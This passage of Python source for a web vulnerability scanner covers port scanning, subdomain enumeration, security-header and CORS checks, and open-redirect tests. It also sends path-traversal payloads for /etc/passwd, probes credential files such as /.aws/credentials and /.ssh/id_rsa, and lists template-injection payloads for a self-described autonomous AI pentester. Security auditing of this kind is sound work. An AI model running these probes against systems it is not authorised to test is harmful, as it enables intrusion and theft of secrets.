        162: 'SNMP-Trap', 389: 'LDAP', 443: 'HTTPS', 445: 'SMB', 465: 'SMTPS',
        502: 'Modbus', 587: 'SMTP-Submission', 636: 'LDAPS', 993: 'IMAPS',
        995: 'POP3S', 1433: 'MSSQL', 1723: 'PPTP', 1883: 'MQTT', 3306: 'MySQL',
        3389: 'RDP', 5432: 'PostgreSQL', 5683: 'CoAP', 5900: 'VNC',
        6379: 'Redis', 8080: 'HTTP-Proxy', 8088: 'HTTP-Alt', 8443: 'HTTPS-Alt',
        9000: 'HTTP-Alt', 9090: 'HTTP-Alt', 27017: 'MongoDB'
    }
    open_ports = []
    
    def probe_port(port, service_name):
        if check_stop(): return None
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(2.0)
                if s.connect_ex((target, port)) == 0:
                    banner = ""
                    try:
                        if port in [80, 8080, 8088, 9000, 9090]:
                            s.send(b"HEAD / HTTP/1.0\r\nHost: %b\r\n\r\n" % target.encode())
                        elif port in [443, 8443]:
                            s.send(b"HEAD / HTTP/1.0\r\nHost: %b\r\n\r\n" % target.encode())
                        elif port in [21]:
                            pass
                        elif port in [22, 23]:
                            pass
                        banner = s.recv(2048).decode(errors='ignore').strip()
                        if banner:
                            banner = banner.split('\n')[0].strip()
                    except:
                        pass
                    return (port, service_name, banner)
        except:
            pass
        return None

    # Use ThreadPoolExecutor for high-speed scanning
    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = {executor.submit(probe_port, p, s): p for p, s in common_ports.items()}
        for i, future in enumerate(as_completed(futures)):
            if check_stop(): break
            result = future.result()
            if result:
                port, service, banner = result
                open_ports.append(port)
                msg = f"NMAP-FALLBACK: Found open port {port} ({service})"
                if banner: msg += f" - Banner: {banner}"
                add_finding('med', msg, asset=f"PORT_{port}: {service}", tool='nmap')
                log('green', f'[NMAP-FALLBACK] Found: {port}/tcp {service}')
            
            progress = 10 + int(((i + 1) / len(common_ports)) * 90)
            if i % 5 == 0: # Reduce log noise
                log('cyan', f'[NMAP-FALLBACK] Scanning progress: {progress}%', tool='nmap', progress=progress)

    return sorted(open_ports)

def run_nmap_scan(target):
    """Fast NMAP Audit - FULL 65535 ports with MAXIMUM speed optimizations"""
    if check_stop(): return []
    log('cyan', f'[NMAP] Starting FAST Audit on {target}...', tool='nmap', progress=0)
    
    # Define fast, comprehensive phase with all speed optimizations (all ports!)
    phases = [
        {
            'name': 'Full Port Service Scan',
            'cmd': ['nmap', '-sV', '-sC', '-Pn', '-T5', '--min-parallelism', '200', '--max-rtt-timeout', '300ms', '--initial-rtt-timeout', '100ms', '--max-retries', '1', '--host-timeout', '15m', '-p-', target],
            'desc': 'Fast FULL PORT scan (all 65535 ports) with service detection'
        }
    ]
    
    open_ports = []
    for i, phase in enumerate(phases):
        progress = int(((i + 1) / len(phases)) * 100)
        log('cyan', f'[NMAP] Phase {i+1}/{len(phases)}: {phase["name"]}...', tool='nmap', progress=progress)
        
        # Trigger education log for the phase
        if 'Service' in phase['name']: edu_log('nmap_service')
        elif 'Full' in phase['name']: edu_log('nmap_full')
        elif 'OS' in phase['name']: edu_log('nmap_os')
        elif 'Vuln' in phase['name']: edu_log('nmap_vuln')
        
        log('cyan', f'[NMAP] Executing: {" ".join(phase["cmd"])}')
        
        try:
            process = subprocess.Popen(
                phase['cmd'],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            scan_state['active_process'] = process
        except FileNotFoundError:
            log('yellow', f'[NMAP] Binary not found for phase "{phase["name"]}". Triggering fallback...')
            return run_nmap_python_fallback(target)
        except Exception as e:
            log('yellow', f'[NMAP] Phase "{phase["name"]}" failed to start: {e}')
            continue

        try:
            for line in process.stdout:
                if scan_state['stop_requested']:
                    process.terminate()
                    break
                # Parse Open Ports
                if '/tcp' in line and 'open' in line:
                    parts = line.split()
                    port_proto = parts[0]
                    port = int(port_proto.split('/')[0])
                    service = parts[2]
                    version = ' '.join(parts[3:]) if len(parts) > 3 else 'unknown'
                    
                    if port not in open_ports:
                        open_ports.append(port)
                        severity = 'high' if port in RISKY_PORTS else 'med'
                        add_finding(severity, f'NMAP [{phase["name"]}]: Found {port}/tcp ({service})', asset=f"PORT_{port}: {service}", tool='nmap')
                        log('green', f'[NMAP] Found: {port}/tcp {service}')

                # Parse UDP Ports
                if '/udp' in line and 'open' in line:
                    parts = line.split()
                    port_proto = parts[0]
                    port = int(port_proto.split('/')[0])
                    service = parts[2]
                    add_finding('med', f'NMAP [UDP]: Found {port}/udp ({service})', asset=f"UDP_PORT_{port}: {service}", tool='nmap')
                    log('yellow', f'[NMAP] UDP Found: {port}/udp {service}')

                # Parse Script Findings
                if '| ' in line and any(k in line.lower() for k in ['vulnerable', 'vulnerability', 'exploit', 'critical']):
                    msg = line.strip('| ').strip()
                    add_finding('high', f'NMAP-NSE: {msg}', tool='nmap')
                    log('red', f'[NMAP-NSE] {msg}')

                # Parse OS Detection
                if 'OS details:' in line:
                    os_info = line.split('OS details:')[1].strip()
                    scan_state['discovered_assets'].add(f"OS_DETECTION: {os_info}")
                    log('green', f'[NMAP] OS Identified: {os_info}')

            process.wait()
        except Exception as e:
            log('yellow', f'[NMAP] Phase "{phase["name"]}" failed: {e}')

    log('green', f'[NMAP] Ultra Audit complete. Found {len(open_ports)} TCP ports.', tool='nmap', progress=100)
    return open_ports

def run_tech_stack_detection(target):
    """ADVANCED: Identify Technology Stack & ALL PROTOCOLS (Wappalyzer style)"""
    log('cyan', f'[TECH-STACK] Identifying technologies and protocols on {target}...', tool='wayback', progress=0)
    
    try:
        response, base_url = request_with_fallback(target, '/')
        headers = response.headers
        content = response.text.lower()
        
        stack = defaultdict(list)
        
        # 1. Server & Infrastructure
        server = headers.get('Server', '')
        if server: stack['Infrastructure'].append(server)
        
        # 2. PROTOCOL DETECTION
        protocol_sigs = {
            'GraphQL': ['graphql', 'graphiql', '__schema', '__type'],
            'SOAP': ['soap-env', 'soapenv', 'envelope', 'wsdl'],
            'gRPC': ['grpc', 'grpc-web'],
            'WebSocket': ['websocket', 'ws://', 'wss://'],
            'WebDAV': ['dav', 'webdav'],
            'SSE': ['eventsource', 'text/event-stream'],
            'REST': ['/api/v1/', '/api/v2/', '/v1/', '/v2/'],
            'HTTP/2': ['h2', 'http/2'],
            'HTTP/3': ['h3', 'http/3', 'quic']
        }
        
        for proto, sigs in protocol_sigs.items():
            header_check = any(proto.lower() in str(v).lower() for v in headers.values())
            content_check = any(sig in content for sig in sigs)
            if header_check or content_check:
                stack['Protocols'].append(proto)
                
        # 3. CMS Detection
        cms_sigs = {
            'WordPress': ['wp-content', 'wp-includes', 'wp-json'],
            'Drupal': ['drupal.js', 'sites/all'],
            'Joomla': ['joomla!', 'option=com_'],
            'Magento': ['magento', 'mage/'],
            'Shopify': ['shopify.com', 'cdn.shopify.com']
        }
        for cms, sigs in cms_sigs.items():
            if any(sig in content for sig in sigs):
                stack['CMS'].append(cms)
                
        # 4. Frameworks & Libraries
        js_sigs = {
            'React': ['react.development.js', 'react-dom'],
            'Vue.js': ['vue.js', 'vuejs'],
            'Angular': ['ng-version', 'angular.js'],
            'jQuery': ['jquery.min.js', 'jquery.js'],
            'Bootstrap': ['bootstrap.min.css', 'bootstrap.css']
        }
        for js, sigs in js_sigs.items():
            if any(sig in content for sig in sigs):
                stack['Frontend'].append(js)
                
        # 5. Backend Language
        powered_by = headers.get('X-Powered-By', '')
        if powered_by: stack['Backend'].append(powered_by)
        elif 'php' in content or '.php' in content: stack['Backend'].append('PHP')
        elif 'python' in content or 'django' in content: stack['Backend'].append('Python/Django')
        
        scan_state['tech_stack'] = dict(stack)
        for cat, items in stack.items():
            log('green', f'[TECH-STACK] {cat}: {", ".join(items)}')
            for item in items:
                scan_state['discovered_assets'].add(f"TECH_{cat.upper()}: {item}")
                
    except Exception as e:
        log('yellow', f'[TECH-STACK] Error during detection: {e}')

def run_subdomain_enum(target):
    """Deep subdomain discovery using CRT.SH and DNS resolution"""
    log('cyan', f'[RECON] Starting advanced subdomain discovery on {target}...', tool='shodan', progress=0)
    
    # 1. Certificate Transparency (CRT.SH) - REAL WORLD DATA
    try:
        log('cyan', '[RECON] Querying CRT.SH Certificate Transparency logs...')
        # Query crt.sh for subdomains
        url = f"https://crt.sh/?q=%25.{target}&output=json"
        res = requests.get(url, timeout=15)
        if res.status_code == 200:
            certs = res.json()
            found = set()
            for cert in certs:
                name_value = cert['name_value']
                # cert names can contain multiple domains separated by newline
                for sub in name_value.split('\n'):
                    if sub.endswith(target) and '*' not in sub:
                        found.add(sub.lower())
            
            log('green', f'[RECON] CRT.SH found {len(found)} potential subdomains.')
            
            # Resolve found subdomains in parallel
            active_count = 0
            found_list = list(found)[:50] # Limit to 50 for speed
            
            def resolve_sub(sub):
                if check_stop(): return None
                try:
                    ips = resolve_domain(sub)
                    if ips:
                        return (sub, ips[0])
                except:
                    pass
                return None

            with ThreadPoolExecutor(max_workers=10) as executor:
                futures = {executor.submit(resolve_sub, s): s for s in found_list}
                for i, future in enumerate(as_completed(futures)):
                    if check_stop(): break
                    result = future.result()
                    if result:
                        sub, ip = result
                        scan_state['discovered_assets'].add(f"SUBDOMAIN: {sub} -> {ip}")
                        log('green', f'[+] Active: {sub} ({ip})')
                        active_count += 1
                    
                    if i % 5 == 0:
                        progress = int(((i + 1) / len(found_list)) * 100)
                        log('cyan', f'[RECON] CRT.SH Resolution: {progress}%', tool='shodan', progress=progress)

            log('green', f'[RECON] Confirmed {active_count} active subdomains.')
    except Exception as e:
        log('yellow', f'[RECON] CRT.SH query failed: {e}')

    # 2. Existing Passive OSINT fallbacks...
    return run_subdomain_enum_original(target)

def run_subdomain_enum_original(target):
    """High-speed multi-threaded subdomain enumeration using DNS"""
    log('cyan', f'[DNS] Starting multi-threaded subdomain enumeration for {target}...', tool='shodan', progress=0)
    
    common_prefixes = ['www', 'mail', 'ftp', 'localhost', 'webmail', 'smtp', 'pop', 'ns1', 
                      'webdisk', 'ns2', 'cpanel', 'whm', 'autodiscover', 'autoconfig',
                      'cloud', 'sync', 'office', 'cdn', 'static', 'blog', 'shop', 'my', 'admin', 'internal',
                      'dev', 'staging', 'test', 'beta', 'api', 'cdn', 'assets', 'backup']
    
    subdomains = []
    sensitive_prefixes = {'admin', 'internal', 'dev', 'staging', 'test', 'backup'}
    
    def probe_subdomain(prefix):
        if check_stop(): return None
        subdomain = f"{prefix}.{target}"
        try:
            resolver = dns.resolver.Resolver()
            resolver.nameservers = ['8.8.8.8', '8.8.4.4', '1.1.1.1', '1.0.0.1']
            resolver.lifetime = 5
            resolver.timeout = 2
            answers = resolver.resolve(subdomain, 'A')
            ips = sorted({str(ip) for ip in answers})
            cname = ""
            try:
                cname_answers = resolver.resolve(subdomain, 'CNAME', lifetime=1.0)
                cname = str(cname_answers[0]).rstrip('.')
            except:
                pass
            return (subdomain, ips, cname, prefix)
        except:
            return None

    with ThreadPoolExecutor(max_workers=15) as executor:
        futures = {executor.submit(probe_subdomain, p): p for p in common_prefixes}
        for i, future in enumerate(as_completed(futures)):
            if check_stop(): break
            result = future.result()
            if result:
                sub, ips, cname, prefix = result
                subdomains.append(sub)
                scan_state['discovered_assets'].add(f"SUBDOMAIN: {sub} -> {', '.join(ips)}")
                if cname:
                    scan_state['discovered_assets'].add(f"CNAME: {sub} -> {cname}")
                
                log('green', f'[DNS] Found: {sub} -> {", ".join(ips)}')
                if prefix in sensitive_prefixes:
                    add_finding('low', f'Sensitive subdomain discovered: {sub}')
            
            if i % 5 == 0:
                progress = int(((i + 1) / len(common_prefixes)) * 100)
                log('cyan', f'[DNS] Enumeration progress: {progress}%', tool='shodan', progress=progress)
    
    log('green', f'[DNS] Enumeration complete. Found {len(subdomains)} subdomains.', tool='shodan', progress=100)
    return subdomains

def run_nikto_scan(target):
    """ULTRA NIKTO AUDIT: Python-only implementation with comprehensive checks!"""
    if check_stop(): return 0
    log('cyan', f'[NIKTO] Starting ULTRA-COMPREHENSIVE Python Web Audit on {target}...', tool='nikto', progress=0)
    edu_log('nikto')
    issues_found = 0

    try:
        response, base_url = request_with_fallback(target, '/')
        log('green', f'[NIKTO] Connected via {base_url}', tool='nikto', progress=5)
    except Exception as e:
        log('red', f'[ERROR] Could not connect to {target}: {str(e)}', tool='nikto', progress=100)
        return 0

    session = requests.Session()
    session.headers.update(HTTP_HEADERS)

    # --- 1. Standard Header Checks ---
    log('cyan', f'[NIKTO] Checking security headers...', tool='nikto', progress=10)
    header_checks = [
        ('X-Frame-Options', 'med'), ('X-Content-Type-Options', 'med'),
        ('Strict-Transport-Security', 'med'), ('Content-Security-Policy', 'high'),
        ('Referrer-Policy', 'low'), ('Permissions-Policy', 'low')
    ]
    for header, severity in header_checks:
        if header not in response.headers:
            add_finding(severity, f'Missing security header: {header}', asset=f"VULN_HEADER: {header}", tool='nikto')
            issues_found += 1

    server_header = response.headers.get('Server', '')
    powered_by = response.headers.get('X-Powered-By', '')
    if server_header and re.search(r'\d', server_header):
        add_finding('low', f'Server banner exposes version details ({server_header})', asset=f"SERVER_BANNER: {server_header}", tool='nikto')
        issues_found += 1
    if powered_by:
        add_finding('low', f'X-Powered-By header exposed ({powered_by})', asset=f"X_POWERED_BY: {powered_by}", tool='nikto')
        issues_found += 1

    # --- 2. Check for X-Content-Type-Options on Multiple Responses ---
    log('cyan', f'[NIKTO] Verifying X-Content-Type-Options on multiple endpoints...', tool='nikto', progress=15)
    test_endpoints = ['/', '/robots.txt', '/test', '/api', '/favicon.ico']
    for endpoint in test_endpoints:
        try:
            test_res = session.get(urljoin(base_url, endpoint), timeout=3, allow_redirects=False)
            if test_res.status_code in [200, 301, 302, 404] and 'X-Content-Type-Options' not in test_res.headers:
                add_finding('med', f'Missing X-Content-Type-Options on endpoint {endpoint}', asset=f"XCTO_MISSING: {endpoint}", tool='nikto')
                issues_found += 1
            random_delay(0.1, 0.2)
        except:
            pass

    # --- 3. Cookie Security Check ---
    log('cyan', f'[NIKTO] Checking cookie security attributes...', tool='nikto', progress=20)
    if 'Set-Cookie' in response.headers:
        cookies = session.cookies
        for cookie in cookies:
            cookie_issues = []
            if not cookie.secure:
                cookie_issues.append("Missing Secure attribute")
            if not cookie.has_nonstandard_attr('HttpOnly'):
                cookie_issues.append("Missing HttpOnly attribute")
            if not cookie.has_nonstandard_attr('SameSite'):
                cookie_issues.append("Missing SameSite attribute")
            elif cookie.get_nonstandard_attr('SameSite').lower() in ['none']:
                cookie_issues.append("SameSite=None should be paired with Secure")
            if cookie_issues:
                add_finding('med', f'Cookie "{cookie.name}" has issues: {", ".join(cookie_issues)}', asset=f"INSECURE_COOKIE: {cookie.name}", tool='nikto')
                issues_found += 1

    # --- 4. HTTP Methods & Method Override Check ---
    log('cyan', f'[NIKTO] Checking HTTP methods and method override headers...', tool='nikto', progress=25)
    try:
        options_res = session.options(f'{base_url}/', timeout=3)
        allow_methods = {m.strip().upper() for m in options_res.headers.get('Allow', '').split(',') if m.strip()}
        if allow_methods:
            scan_state['discovered_assets'].add(f"HTTP_ALLOW: {', '.join(sorted(allow_methods))}")
        for method in sorted(allow_methods.intersection({'TRACE', 'PUT', 'DELETE', 'CONNECT'})):
            sev = 'high' if method in ['TRACE', 'PUT', 'DELETE'] else 'med'
            add_finding(sev, f'Potentially dangerous HTTP method enabled: {method}', tool='nikto')
            issues_found += 1
    except:
        pass
    # Check for X-HTTP-Method-Override header support
    try:
        override_headers = HTTP_HEADERS.copy()
        override_headers['X-HTTP-Method-Override'] = 'DELETE'
        test_override = session.get(f'{base_url}/', headers=override_headers, timeout=3)
        if test_override.status_code != 405 and 200 <= test_override.status_code < 300:
            scan_state['discovered_assets'].add("HTTP_METHOD_OVERRIDE_SUPPORTED: X-HTTP-Method-Override")
    except:
        pass

    # --- 5. CORS Misconfiguration Check ---
    log('cyan', f'[NIKTO] Checking CORS misconfiguration...', tool='nikto', progress=30)
    try:
        cors_headers = HTTP_HEADERS.copy()
        cors_headers['Origin'] = 'http://malicious.example.com'
        cors_res = session.get(f'{base_url}/', headers=cors_headers, timeout=3, allow_redirects=False)
        acao = cors_res.headers.get('Access-Control-Allow-Origin')
        acac = cors_res.headers.get('Access-Control-Allow-Credentials')
        if acao == '*':
            add_finding('high', f'CORS Misconfiguration: Access-Control-Allow-Origin set to "*"', asset='CORS_WILDCARD', tool='nikto')
            issues_found += 1
        elif acao == 'http://malicious.example.com' and acac == 'true':
            add_finding('crit', f'CORS Misconfiguration: Trusts arbitrary Origin with Credentials', asset='CORS_ARBITRARY_ORIGIN', tool='nikto')
            issues_found +=1
    except:
        pass

    # --- 6. Open Redirect Check ---
    log('cyan', f'[NIKTO] Checking for open redirects...', tool='nikto', progress=40)
    open_redirect_params = ['url', 'uri', 'redirect', 'next', 'target', 'dest', 'go', 'to', 'out', 'link']
    redirect_payloads = ['http://malicious.example.com', '//malicious.example.com', 'javascript:alert(1)']
    def check_open_redirect(param, payload):
        try:
            url = urljoin(base_url, '/')
            res = session.get(url, params={param: payload}, timeout=3, allow_redirects=False)
            if res.status_code in [301,302,303,307,308]:
                location = res.headers.get('Location', '')
                if 'malicious.example.com' in location or 'javascript:' in location:
                    add_finding('high', f'Open Redirect vulnerability found: ?{param}={payload}', asset=f"OPEN_REDIRECT: {param}", tool='nikto')
                    log('red', f'[NIKTO] OPEN REDIRECT FOUND: ?{param}={payload} → {location}')
                    return True
        except:
            pass
        return False
    for param in open_redirect_params:
        for payload in redirect_payloads:
            if check_open_redirect(param, payload):
                issues_found +=1
                break
            random_delay(0.1,0.2)

    # ---7. Path Normalization Bypass Check ---
    log('cyan', f'[NIKTO] Checking for path normalization bypass...', tool='nikto', progress=55)
    bypass_payloads = ['//etc/passwd', '/%2e%2e/etc/passwd', '/..%2f..%2fetc/passwd', '/%252e%252e%252fetc/passwd', '/../../etc/passwd']
    def check_path_bypass(payload):
        try:
            test_url = urljoin(base_url, payload)
            res = session.get(test_url, timeout=3, allow_redirects=False)
            if 'root:x:' in res.text or '[extensions]' in res.text or 'Windows' in res.text:
                add_finding('crit', f'Path Normalization Bypass/Path Traversal found: {payload}', asset=f"PATH_BYPASS: {payload}", tool='nikto')
                log('red', f'[NIKTO] PATH BYPASS FOUND: {payload}')
                return True
        except:
            pass
        return False
    for payload in bypass_payloads:
        if check_path_bypass(payload):
            issues_found +=1
            break
        random_delay(0.1,0.2)

    # ---8. Sensitive Path Probing ---
    log('cyan', f'[NIKTO] Probing sensitive paths...', tool='nikto', progress=70)
    sensitive_paths = [
        ('/.env', 'crit'), ('/.git/config', 'high'), ('/wp-config.php', 'high'), ('/config.php', 'high'),
        ('/backup.zip', 'high'), ('/server-status', 'med'), ('/phpinfo.php', 'high'),
        ('/.DS_Store', 'med'), ('/actuator/env', 'high'), ('/debug/default/view', 'high'),
        ('/admin', 'low'), ('/login', 'low'), ('/.aws/credentials', 'crit'), ('/.ssh/id_rsa', 'crit')
    ]
    def probe_path(path, severity):
        if check_stop(): return None
        url = urljoin(base_url, path.lstrip('/'))
        try:
            probe = session.get(url, timeout=4, allow_redirects=False)
            if probe.status_code == 200:
                found_secrets = extract_secret_leaks((probe.text or '')[:25000])
                return (path, severity, found_secrets)
            elif probe.status_code in (401, 403):
                return (path, 'restricted', [])
        except:
            pass
        return None
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(probe_path, p, s): p for p, s in sensitive_paths}
        for i, future in enumerate(as_completed(futures)):
            if check_stop(): break
            result = future.result()
            if result:
                path, severity, secrets = result
                if severity == 'restricted':
                    scan_state['discovered_assets'].add(f"RESTRICTED_PATH: {path}")
                else:
                    add_finding(severity, f'Exposed sensitive endpoint: {path} (HTTP 200)', asset=f"EXPOSED_PATH: {path}", tool='nikto')
                    issues_found +=1
                    for leak in secrets:
                        add_finding('crit', f'Potential {leak} leak at {path}', asset=f"LEAKED_SECRET: {leak} @ {path}", tool='nikto')
                        issues_found +=1

    # ---9. JavaScript Analysis ---
    log('cyan', f'[NIKTO] Analyzing JavaScript files...', tool='nikto', progress=90)
    script_sources = re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', response.text or '', flags=re.I)
    def extract_api_endpoints(js_content):
        endpoints = set()
        patterns = [
            r'["\']([/\w-]+/api/[\w/-]*)["\']', r'["\']([/\w-]+/v\d+/[\w/-]*)["\']',
            r'url:\s*["\']([^"\']+)["\']', r'endpoint:\s*["\']([^"\']+)["\']', r'path:\s*["\']([^"\']+)["\']'
        ]
        for pattern in patterns:
            matches = re.findall(pattern, js_content, flags=re.I)
            for match in matches:
                if len(match) > 2 and match not in ['/', 'http', 'https']:
                    endpoints.add(match)
        return list(endpoints)
    def analyze_script(src):
        if check_stop(): return None
        script_url = urljoin(base_url, src)
        try:
            js_res = session.get(script_url, timeout=4)
            if js_res.status_code == 200:
                secrets = extract_secret_leaks(js_res.text[:50000])
                api_endpoints = extract_api_endpoints(js_res.text)
                return (src, secrets, api_endpoints)
        except:
            pass
        return None
    if script_sources:
        unique_scripts = list(set(script_sources))[:10]
        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = {executor.submit(analyze_script, s): s for s in unique_scripts}
            for future in as_completed(futures):
                if check_stop(): break
                result = future.result()
                if result:
                    src, secrets, api_endpoints = result
                    for leak in secrets:
                        add_finding('high', f'Potential {leak} leak in {src}', asset=f"JS_LEAK: {leak}", tool='nikto')
                        issues_found +=1
                    for ep in api_endpoints:
                        scan_state['discovered_assets'].add(f"API_ENDPOINT: {ep}")

    check_tls_certificate(target)
    log('green', f'[NIKTO] Audit complete! Found {issues_found} total issues.', tool='nikto', progress=100)
    return issues_found

def run_nikto_python_fallback(target):
    """High-speed multi-threaded Nikto-like Python implementation"""
    log('yellow', f'[NIKTO] Starting high-speed multi-threaded web scan on {target}...', tool='nikto', progress=0)
    issues_found = 0
    try:
        response, base_url = request_with_fallback(target, '/')
        log('green', f'[NIKTO] Connected via {base_url}', tool='nikto', progress=5)
    except Exception as e:
        log('red', f'[ERROR] Could not connect to {target}: {str(e)}', tool='nikto', progress=100)
        return 0
    
    # 1. Header Checks
    checks = [
        ('X-Frame-Options', 'med'),
        ('X-Content-Type-Options', 'med'),
        ('Strict-Transport-Security', 'med'),
        ('Content-Security-Policy', 'high'),
        ('Referrer-Policy', 'low'),
        ('Permissions-Policy', 'low')
    ]
    for header, severity in checks:
        if header not in response.headers:
            add_finding(severity, f'Missing security header: {header}', asset=f"VULN_HEADER: {header}", tool='nikto')
            issues_found += 1
            
    server_header = response.headers.get('Server', '')
    powered_by = response.headers.get('X-Powered-By', '')
    if server_header and re.search(r'\d', server_header):
        add_finding('low', f'Server banner exposes version details ({server_header})', asset=f"SERVER_BANNER: {server_header}", tool='nikto')
        issues_found += 1
    if powered_by:
        add_finding('low', f'X-Powered-By header exposed ({powered_by})', asset=f"X_POWERED_BY: {powered_by}", tool='nikto')
        issues_found += 1

    # 2. HTTP Methods
    try:
        options_res = requests.options(f'{base_url}/', timeout=3, headers=HTTP_HEADERS)
        allow_methods = {m.strip().upper() for m in options_res.headers.get('Allow', '').split(',') if m.strip()}
        if allow_methods:
            scan_state['discovered_assets'].add(f"HTTP_ALLOW: {', '.join(sorted(allow_methods))}")
        for method in sorted(allow_methods.intersection({'TRACE', 'PUT', 'DELETE', 'CONNECT'})):
            sev = 'high' if method in {'TRACE', 'PUT', 'DELETE'} else 'med'
            add_finding(sev, f'Potentially dangerous HTTP method enabled: {method}', tool='nikto')
            issues_found += 1
    except:
        pass

    # 3. Parallel Path Probing
    sensitive_paths = [
        ('/.env', 'crit'), ('/.git/config', 'high'), ('/wp-config.php', 'high'),
        ('/config.php', 'high'), ('/backup.zip', 'high'), ('/server-status', 'med'),
        ('/phpinfo.php', 'high'), ('/.DS_Store', 'med'), ('/actuator/env', 'high'),
        ('/debug/default/view', 'high'), ('/admin', 'low'), ('/login', 'low')
    ]
    
    def probe_path(path, severity):
        if check_stop(): return None
        url = urljoin(f'{base_url}/', path.lstrip('/'))
        try:
            probe = requests.get(url, timeout=3, headers=HTTP_HEADERS, allow_redirects=False)
            if probe.status_code == 200:
                found_secrets = extract_secret_leaks((probe.text or '')[:25000])
                return (path, severity, found_secrets)
            elif probe.status_code in (401, 403):
                return (path, 'restricted', [])
        except:
            pass
        return None

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(probe_path, p, s): p for p, s in sensitive_paths}
        for i, future in enumerate(as_completed(futures)):
            if check_stop(): break
            result = future.result()
            if result:
                path, severity, secrets = result
                if severity == 'restricted':
                    scan_state['discovered_assets'].add(f"RESTRICTED_PATH: {path}")
                else:
                    add_finding(severity, f'Exposed sensitive endpoint: {path} (HTTP 200)', asset=f"EXPOSED_PATH: {path}", tool='nikto')
                    issues_found += 1
                    for leak in secrets:
                        add_finding('high', f'Potential {leak} leak at {path}', asset=f"POTENTIAL_SECRET: {leak} @ {path}", tool='nikto')
                        issues_found += 1
            
            if i % 4 == 0:
                progress = 40 + int(((i + 1) / len(sensitive_paths)) * 40)
                log('cyan', f'[NIKTO] Path probing: {progress}%', tool='nikto', progress=progress)

    # 4. Parallel Script Source Analysis
    script_sources = re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', response.text or '', flags=re.I)
    
    def extract_api_endpoints(js_content):
        endpoints = set()
        patterns = [
            r'["\']([/\w-]+/api/[\w/-]*)["\']',
            r'["\']([/\w-]+/v\d+/[\w/-]*)["\']',
            r'url:\s*["\']([^"\']+)["\']',
            r'endpoint:\s*["\']([^"\']+)["\']',
            r'path:\s*["\']([^"\']+)["\']'
        ]
        for pattern in patterns:
            matches = re.findall(pattern, js_content, flags=re.I)
            for match in matches:
                if len(match) > 2 and match not in ['/', 'http', 'https']:
                    endpoints.add(match)
        return sorted(list(endpoints))
    
    def analyze_script(src):
        if check_stop(): return None
        script_url = urljoin(f'{base_url}/', src)
        try:
            js_res = requests.get(script_url, timeout=3, headers=HTTP_HEADERS)
            if js_res.status_code == 200:
                js_content = (js_res.text or '')[:50000]
                secrets = extract_secret_leaks(js_content)
                api_endpoints = extract_api_endpoints(js_content)
                return (src, secrets, api_endpoints)
        except:
            pass
        return None

    if script_sources:
        unique_scripts = list(set(script_sources))[:10] # Limit for speed
        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = {executor.submit(analyze_script, s): s for s in unique_scripts}
            for i, future in enumerate(as_completed(futures)):
                if check_stop(): break
                result = future.result()
                if result:
                    src, secrets, api_endpoints = result
                    for leak in secrets:
                        add_finding('high', f'Potential {leak} leak in JavaScript: {src}', asset=f"POTENTIAL_SECRET_JS: {leak} @ {src}", tool='nikto')
                        issues_found += 1
                    if api_endpoints:
                        for endpoint in api_endpoints[:10]:
                            scan_state['discovered_assets'].add(f"API_ENDPOINT: {endpoint} @ {src}")
                        log('green', f'[NIKTO] Found {len(api_endpoints)} potential API endpoints in {src}')
                
                progress = 80 + int(((i + 1) / len(unique_scripts)) * 20)
                log('cyan', f'[NIKTO] Script analysis: {progress}%', tool='nikto', progress=progress)

    check_tls_certificate(target)
    log('green', f'[NIKTO] High-speed scan complete. Found {issues_found} issues.', tool='nikto', progress=100)
    return issues_found

def run_autonomous_audit(target):
    """Autonomous Self-Thinking AI Penetration Tester - OBSERVE → HYPOTHESIZE → TEST → ANALYZE → PIVOT"""
    if check_stop(): return 0
    log('cyan', f'[AUTONOMOUS-AI] Starting self-thinking penetration test on {target}...', tool='ai', progress=0)
    issues_found = 0
    try:
        response, base_url = request_with_fallback(target, '/')
        log('green', f'[AUTONOMOUS-AI] Connected to target via {base_url}', tool='ai', progress=5)
        session = requests.Session()
        session.headers.update(HTTP_HEADERS)
        
        # --- 1. OBSERVE PHASE ---
        log('blue', f'[AUTONOMOUS-AI] [1] OBSERVE: Analyzing target...', tool='ai', progress=10)
        log('cyan', f'  [OBSERVE] HTTP Headers:', tool='ai', progress=12)
        for hdr, val in response.headers.items():
            log('cyan', f'    {hdr}: {val[:100]}', tool='ai')
        log('cyan', f'  [OBSERVE] Status Code: {response.status_code}', tool='ai')
        log('cyan', f'  [OBSERVE] Response Length: {len(response.text)}', tool='ai')
        params = crawl_for_parameters(target)
        if params:
            log('cyan', f'  [OBSERVE] Found parameters: {params}', tool='ai')
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        if forms:
            log('cyan', f'  [OBSERVE] Found {len(forms)} HTML forms', tool='ai')
        
        # --- 2. HYPOTHESIZE PHASE ---
        log('blue', f'[AUTONOMOUS-AI] [2] HYPOTHESIZE: Generating hypotheses...', tool='ai', progress=30)
        hypotheses = []
        if params:
            hypotheses.append(('SQLi', 'Found parameters, testing for SQL Injection', ['id', 'user', 'search']))
            hypotheses.append(('XSS', 'Found parameters, testing for Cross-Site Scripting', ['q', 'search', 'name']))
            hypotheses.append(('LFI', 'Found parameters, testing for Local File Inclusion', ['file', 'path', 'page']))
            hypotheses.append(('SSTI', 'Found parameters, testing for Server-Side Template Injection', ['tpl', 'template']))
        if forms:
            hypotheses.append(('CSRF', 'Found forms, checking for CSRF tokens', forms))
        if 'Set-Cookie' in response.headers:
            hypotheses.append(('AUTH', 'Found cookies, checking JWT and session management', []))
        
        for hypo_type, hypo_desc, hypo_data in hypotheses:
            log('yellow', f'  [HYPOTHESIZE] {hypo_type}: {hypo_desc}', tool='ai')
        
        # --- 3. TEST PHASE ---
        log('blue', f'[AUTONOMOUS-AI] [3] TEST: Verifying hypotheses...', tool='ai', progress=50)
        
        # Test SSTI first (simple math check)
        ssti_payloads = [
            ('Jinja2/Twig/Nunjucks', '{{7*7}}', '49'),
            ('FreeMarker/Mako', '${7*7}', '49'),
            ('ERB/JSP', '<%=7*7%>', '49'),
            ('Velocity', '#set($x=7*7)$x', '49'),
